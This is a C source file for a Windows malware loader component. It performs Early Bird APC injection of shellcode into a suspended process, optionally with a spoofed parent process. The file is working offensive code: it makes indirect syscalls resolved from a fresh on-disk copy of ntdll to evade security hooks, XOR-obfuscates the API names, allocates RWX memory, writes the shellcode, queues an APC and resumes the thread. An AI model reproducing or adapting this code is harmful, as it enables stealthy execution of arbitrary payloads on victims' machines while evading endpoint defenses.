/*
 * Author: 28Zaakypro@proton.me
 * Process Injection - Early Bird APC injection with PPID spoofing
 * Creates suspended process, injects shellcode, queues APC, resumes thread
 */

#include "injection.h"
#include "obfuscation.h"
#include "ppid_spoofing.h"
#include <stdio.h>
#include <string.h>

// NTSTATUS definitions
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Syscall info structure
typedef struct _SYSCALL_INFO {
    DWORD ssn;
    PVOID syscallAddress;
} SYSCALL_INFO, *PSYSCALL_INFO;

// Syscall table for injection
static SYSCALL_INFO g_InjectionSyscallTable[5] = {0};

#define IDX_NtAllocateVirtualMemory 0
#define IDX_NtWriteVirtualMemory    1
#define IDX_NtQueueApcThread        2
#define IDX_NtResumeThread          3
#define IDX_NtClose                 4

static PVOID g_FreshNtdll = NULL;

// Internal prototypes
static BOOL LoadFreshNtdllForInjection(void);
static PVOID FindSyscallAddressInNtdll(PVOID moduleBase);
static PVOID GetFunctionAddressByName(PVOID moduleBase, const char *name);
static DWORD GetSSNFromFunction(PVOID functionAddress);

// Assembly syscall stubs (dosyscall.S)
extern NTSTATUS DoSyscall(
    DWORD ssn, PVOID syscallAddr,
    PVOID arg1, PVOID arg2, PVOID arg3,
    PVOID arg4, PVOID arg5, PVOID arg6);

extern NTSTATUS DoSyscall11(
    DWORD ssn, PVOID syscallAddr,
    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4,
    PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8,
    PVOID arg9, PVOID arg10, PVOID arg11);

// Indirect syscall wrappers

static NTSTATUS SysAllocMem(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    SYSCALL_INFO *info = &g_InjectionSyscallTable[IDX_NtAllocateVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)BaseAddress, (PVOID)ZeroBits,
        (PVOID)RegionSize, (PVOID)(ULONG_PTR)AllocationType, (PVOID)(ULONG_PTR)Protect);
}

static NTSTATUS SysWriteMem(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    SYSCALL_INFO *info = &g_InjectionSyscallTable[IDX_NtWriteVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, BaseAddress, Buffer,
        (PVOID)NumberOfBytesToWrite, (PVOID)NumberOfBytesWritten, NULL);
}

static NTSTATUS SysQueueTask(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3)
{
    SYSCALL_INFO *info = &g_InjectionSyscallTable[IDX_NtQueueApcThread];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ThreadHandle, ApcRoutine, ApcArgument1,
        ApcArgument2, ApcArgument3, NULL);
}

static NTSTATUS SysResumeTask(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount)
{
    SYSCALL_INFO *info = &g_InjectionSyscallTable[IDX_NtResumeThread];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ThreadHandle, (PVOID)PreviousSuspendCount, NULL,
        NULL, NULL, NULL);
}

static NTSTATUS SysCloseHandle(HANDLE Handle)
{
    SYSCALL_INFO *info = &g_InjectionSyscallTable[IDX_NtClose];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)Handle, NULL, NULL, NULL, NULL, NULL);
}

// Utility functions for syscall initialization

// Loads fresh ntdll.dll from disk (clean copy without hooks)
static BOOL LoadFreshNtdllForInjection(void)
{
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    lstrcatA(ntdllPath, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    g_FreshNtdll = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!g_FreshNtdll) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, g_FreshNtdll, fileSize, &bytesRead, NULL)) {
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}

// Finds "syscall; ret" instruction (0F 05 C3) in ntdll
static PVOID FindSyscallAddressInNtdll(PVOID moduleBase)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    PVOID textBase = NULL;
    DWORD textSize = 0;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            textBase = (BYTE *)moduleBase + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textBase) return NULL;

    // Chercher 0F 05 C3
    BYTE *current = (BYTE *)textBase;
    BYTE *end = current + textSize - 2;

    while (current < end) {
        if (current[0] == 0x0F && current[1] == 0x05 && current[2] == 0xC3) {
            return current;
        }
        current++;
    }

    return NULL;
}

// Finds function address in Export Directory
static PVOID GetFunctionAddressByName(PVOID moduleBase, const char *functionName)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);
    
    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + exportDirRva);

    DWORD *addressOfFunctions = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((BYTE *)moduleBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char *currentName = (char *)((BYTE *)moduleBase + addressOfNames[i]);
        if (lstrcmpA(currentName, functionName) == 0) {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD functionRva = addressOfFunctions[ordinal];
            return (BYTE *)moduleBase + functionRva;
        }
    }

    return NULL;
}

// Extracts System Service Number from syscall function (mov eax, SSN pattern)
static DWORD GetSSNFromFunction(PVOID functionAddress)
{
    BYTE *bytes = (BYTE *)functionAddress;

    // Check signature: mov r10, rcx
    if (bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1) {
        return 0;
    }

    // Check: mov eax, imm32
    if (bytes[3] != 0xB8) {
        return 0;
    }

    // Extraire SSN
    return *(DWORD *)(bytes + 4);
}

// Initializes indirect syscalls for injection

BOOL InitializeInjectionSyscalls(void)
{
    #ifndef PRODUCTION
    printf("[*] Initializing indirect syscalls for injection...\n");
    #endif

    // Load fresh ntdll
    if (!LoadFreshNtdllForInjection()) {
        #ifndef PRODUCTION
        printf("[-] Failed to load ntdll.dll\n");
        #endif
        return FALSE;
    }

    // Find syscall address in mapped ntdll (obfuscated)
    BYTE obfNtdll[] = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    char ntdll[16];
    DeobfuscateString(obfNtdll, 9, 0x42, ntdll);
    
    HMODULE hNtdll = GetModuleHandleA(ntdll);
    PVOID syscallAddress = FindSyscallAddressInNtdll(hNtdll);
    
    if (!syscallAddress) {
        #ifndef PRODUCTION
        printf("[-] Failed to find syscall instruction\n");
        #endif
        return FALSE;
    }

    // Obfuscated function names (XOR 0x42)
    BYTE obfFuncs[][30] = {
        {0x0C, 0x36, 0x03, 0x2E, 0x2E, 0x2D, 0x21, 0x23, 0x36, 0x27, 0x14, 0x2B, 0x30, 0x36, 0x37, 0x23, 0x2E, 0x0F, 0x27, 0x2F, 0x2D, 0x30, 0x3B}, // NtAllocateVirtualMemory
        {0x0C, 0x36, 0x15, 0x30, 0x2B, 0x36, 0x27, 0x14, 0x2B, 0x30, 0x36, 0x37, 0x23, 0x2E, 0x0F, 0x27, 0x2F, 0x2D, 0x30, 0x3B}, // NtWriteVirtualMemory
        {0x0C, 0x36, 0x13, 0x37, 0x27, 0x37, 0x27, 0x03, 0x32, 0x21, 0x16, 0x2A, 0x30, 0x27, 0x23, 0x26}, // NtQueueApcThread
        {0x0C, 0x36, 0x10, 0x27, 0x31, 0x37, 0x2F, 0x27, 0x16, 0x2A, 0x30, 0x27, 0x23, 0x26}, // NtResumeThread
        {0x0C, 0x36, 0x01, 0x2E, 0x2D, 0x31, 0x27} // NtClose
    };
    
    char functionNames[5][30];
    DeobfuscateString(obfFuncs[0], 23, 0x42, functionNames[0]);
    DeobfuscateString(obfFuncs[1], 20, 0x42, functionNames[1]);
    DeobfuscateString(obfFuncs[2], 16, 0x42, functionNames[2]);
    DeobfuscateString(obfFuncs[3], 14, 0x42, functionNames[3]);
    DeobfuscateString(obfFuncs[4], 7, 0x42, functionNames[4]);

    for (int i = 0; i < 5; i++) {
        PVOID funcAddr = GetFunctionAddressByName(hNtdll, functionNames[i]);
        if (!funcAddr) {
            #ifndef PRODUCTION
            printf("[-] Function '%s' (index %d) not found\n", functionNames[i], i);
            #endif
            return FALSE;
        }

        DWORD ssn = GetSSNFromFunction(funcAddr);
        if (ssn == 0) {
            #ifndef PRODUCTION
            printf("[-] SSN extraction failed for %s\n", functionNames[i]);
            #endif
            return FALSE;
        }

        g_InjectionSyscallTable[i].ssn = ssn;
        g_InjectionSyscallTable[i].syscallAddress = syscallAddress;
    }

    #ifndef PRODUCTION
    printf("[+] Indirect syscalls initialized successfully\n\n");
    #endif
    return TRUE;
}

// APC INJECTION

BOOL InjectShellcodeAPC(
    const char* targetProcess,
    BYTE* shellcode,
    SIZE_T shellcodeSize,
    PINJECTION_RESULT result)
{
    NTSTATUS status;
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    // Initialize result
    ZeroMemory(result, sizeof(INJECTION_RESULT));
    lstrcpynA(result->targetProcess, targetProcess, MAX_PATH);

    #ifndef PRODUCTION
    printf("[*] Création du processus en mode suspendu...\n");
    #endif
    #ifndef PRODUCTION
    printf("    Cible: %s\n", targetProcess);
    #endif

    // STEP 1: Create suspended process
    if (!CreateProcessA(
            NULL,
            (LPSTR)targetProcess,
            NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi))
    {
        #ifndef PRODUCTION
        printf("[-] Échec de CreateProcessA: %lu\n", GetLastError());
        #endif
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Process created (PID: %lu, TID: %lu)\n", pi.dwProcessId, pi.dwThreadId);
    #endif
    result->processId = pi.dwProcessId;
    result->threadId = pi.dwThreadId;

    // STEP 2: Allocate RWX memory in target process
    #ifndef PRODUCTION
    printf("[*] Allocating RWX memory...\n");
    #endif
    
    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcodeSize;

    status = SysAllocMem(
        pi.hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(status)) {
        #ifndef PRODUCTION
        printf("[-] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
        #endif
        SysCloseHandle(pi.hThread);
        SysCloseHandle(pi.hProcess);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Memory allocated at: 0x%p (%zu bytes)\n", baseAddress, regionSize);
    #endif
    result->allocatedAddress = baseAddress;
    result->allocatedSize = regionSize;

    // STEP 3: Write shellcode
    #ifndef PRODUCTION
    printf("[*] Writing shellcode...\n");
    #endif

    SIZE_T bytesWritten = 0;
    status = SysWriteMem(
        pi.hProcess,
        baseAddress,
        shellcode,
        shellcodeSize,
        &bytesWritten);

    if (!NT_SUCCESS(status)) {
        #ifndef PRODUCTION
        printf("[-] NtWriteVirtualMemory failed: 0x%08lX\n", status);
        #endif
        SysCloseHandle(pi.hThread);
        SysCloseHandle(pi.hProcess);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Shellcode written (%zu bytes)\n", bytesWritten);
    #endif

    // STEP 4: Register APC
    #ifndef PRODUCTION
    printf("[*] Registering APC...\n");
    #endif

    status = SysQueueTask(
        pi.hThread,
        baseAddress,  // APC routine = notre shellcode
        NULL,         // ApcArgument1
        NULL,         // ApcArgument2
        NULL);        // ApcArgument3

    if (!NT_SUCCESS(status)) {
        #ifndef PRODUCTION
        printf("[-] NtQueueApcThread failed: 0x%08lX\n", status);
        #endif
        SysCloseHandle(pi.hThread);
        SysCloseHandle(pi.hProcess);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] APC registered on thread\n");
    #endif

    // STEP 5: Resume thread
    #ifndef PRODUCTION
    printf("[*] Resuming thread (execution imminent)...\n");
    #endif

    ULONG suspendCount = 0;
    status = SysResumeTask(pi.hThread, &suspendCount);

    if (!NT_SUCCESS(status)) {
        #ifndef PRODUCTION
        printf("[-] NtResumeThread failed: 0x%08lX\n", status);
        #endif
        SysCloseHandle(pi.hThread);
        SysCloseHandle(pi.hProcess);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Thread resumed (suspend count: %lu)\n", suspendCount);
    #endif

    // Clean up handles
    SysCloseHandle(pi.hThread);
    SysCloseHandle(pi.hProcess);

    result->success = TRUE;
    #ifndef PRODUCTION
    printf("\n[+] Injection APC successful!\n");
    #endif
    #ifndef PRODUCTION
    printf("    PID: %lu\n", result->processId);
    #endif
    #ifndef PRODUCTION
    printf("    Shellcode: 0x%p (%zu bytes)\n\n", result->allocatedAddress, result->allocatedSize);
    #endif

    return TRUE;
}

// Cleans up allocated resources for injection syscalls

VOID CleanupInjectionSyscalls(void)
{
    if (g_FreshNtdll) {
        VirtualFree(g_FreshNtdll, 0, MEM_RELEASE);
        g_FreshNtdll = NULL;
    }
}

// Prints injection result in a formatted manner

VOID PrintInjectionResult(PINJECTION_RESULT result)
{
    printf("=== Injection Result ===\n");

    if (result->success) {
        #ifndef PRODUCTION
        printf("  [✓] Injection successful\n");
        #endif
    } else {
        #ifndef PRODUCTION
        printf("  [✗] Injection failed\n");
        #endif
    }

    #ifndef PRODUCTION
    printf("  • Target Process    : %s\n", result->targetProcess);
    #endif
    #ifndef PRODUCTION
    printf("  • PID               : %lu\n", result->processId);
    #endif
    #ifndef PRODUCTION
    printf("  • TID               : %lu\n", result->threadId);
    #endif
    #ifndef PRODUCTION
    printf("  • Memory Address     : 0x%p\n", result->allocatedAddress);
    #endif
    #ifndef PRODUCTION
    printf("  • Allocated Size     : %zu bytes\n", result->allocatedSize);
    #endif
    #ifndef PRODUCTION
    printf("\n");
    #endif
}

// APC INJECTION WITH PPID SPOOFING

BOOL InjectShellcodeAPCWithPPIDSpoof(
    const char* targetProcess,
    const char* parentProcess,
    BYTE* shellcode,
    SIZE_T shellcodeSize,
    PINJECTION_RESULT result)
{
    NTSTATUS status;
    PPID_SPOOF_RESULT spoofResult = {0};

    // Initialize result
    ZeroMemory(result, sizeof(INJECTION_RESULT));
    lstrcpynA(result->targetProcess, targetProcess, MAX_PATH);

    #ifndef PRODUCTION
    printf("[*] APC Injection with PPID Spoofing...\n");
    #endif
    #ifndef PRODUCTION
    printf("    Target: %s\n", targetProcess);
    #endif
    #ifndef PRODUCTION
    printf("    Parent spoofé: %s\n\n", parentProcess);
    #endif

    // STEP 1: Create process with spoofed PPID
    if (!CreateProcessWithSpoofedPPID(targetProcess, parentProcess, TRUE, &spoofResult)) {
        #ifndef PRODUCTION
        printf("[-] PPID Spoofing failed\n");
        #endif
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("\n");
    #endif

    result->processId = spoofResult.processId;
    result->threadId = spoofResult.threadId;

    // STEP 2: Allocate RWX memory
    #ifndef PRODUCTION
    printf("[*] Allocating RWX memory...\n");
    #endif
    
    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcodeSize;

    status = SysAllocMem(
        spoofResult.hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(status)) {
        #ifndef PRODUCTION
        printf("[-] NtAllocateVirtualMemory échoué: 0x%08lX\n", status);
        #endif
        SysCloseHandle(spoofResult.hThread);
        SysCloseHandle(spoofResult.hProcess);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Mémoire allouée à: 0x%p (%zu bytes)\n", baseAddress, regionSize);
    #endif
    result->allocatedAddress = baseAddress;
    result->allocatedSize = regionSize;

    // STEP 3: Write shellcode
    #ifndef PRODUCTION
    printf("[*] Writing shellcode...\n");
    #endif

    SIZE_T bytesWritten = 0;
    status = SysWriteMem(
        spoofResult.hProcess,
        baseAddress,
        shellcode,
        shellcodeSize,
        &bytesWritten);

    if (!NT_SUCCESS(status)) {
        #ifndef PRODUCTION
        printf("[-] NtWriteVirtualMemory échoué: 0x%08lX\n", status);
        #endif
        SysCloseHandle(spoofResult.hThread);
        SysCloseHandle(spoofResult.hProcess);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Shellcode written (%zu bytes)\n", bytesWritten);
    #endif

    // STEP 4: Register APC
    #ifndef PRODUCTION
    printf("[*] Registering APC...\n");
    #endif

    status = SysQueueTask(
        spoofResult.hThread,
        baseAddress,
        NULL, NULL, NULL);

    if (!NT_SUCCESS(status)) {
        #ifndef PRODUCTION
        printf("[-] NtQueueApcThread failed: 0x%08lX\n", status);
        #endif
        SysCloseHandle(spoofResult.hThread);
        SysCloseHandle(spoofResult.hProcess);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] APC registered\n");
    #endif

    // STEP 5: Resume thread
    #ifndef PRODUCTION
    printf("[*] Resuming thread...\n");
    #endif

    ULONG suspendCount = 0;
    status = SysResumeTask(spoofResult.hThread, &suspendCount);

    if (!NT_SUCCESS(status)) {
        #ifndef PRODUCTION
        printf("[-] NtResumeThread failed: 0x%08lX\n", status);
        #endif
        SysCloseHandle(spoofResult.hThread);
        SysCloseHandle(spoofResult.hProcess);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Thread resumed\n");
    #endif

    // CRITICAL: Wait for APC to execute before closing handles
    // If we close immediately, the process dies before shellcode runs
    #ifndef PRODUCTION
    printf("[*] Waiting for APC execution (2s)...\n");
    #endif
    Sleep(2000);  // Give APC time to execute in the target process

    // Clean up 
    SysCloseHandle(spoofResult.hThread);
    SysCloseHandle(spoofResult.hProcess);

    result->success = TRUE;
    #ifndef PRODUCTION
    printf("\n[+] Injection APC with PPID Spoofing successful!\n");
    #endif
    #ifndef PRODUCTION
    printf("    PID: %lu\n", result->processId);
    #endif
    #ifndef PRODUCTION
    printf("    Parent spoofed: %s (PID: %lu)\n", parentProcess, spoofResult.spoofedParentPid);
    #endif
    #ifndef PRODUCTION
    printf("    Shellcode: 0x%p\n\n", result->allocatedAddress);
    #endif

    return TRUE;
}


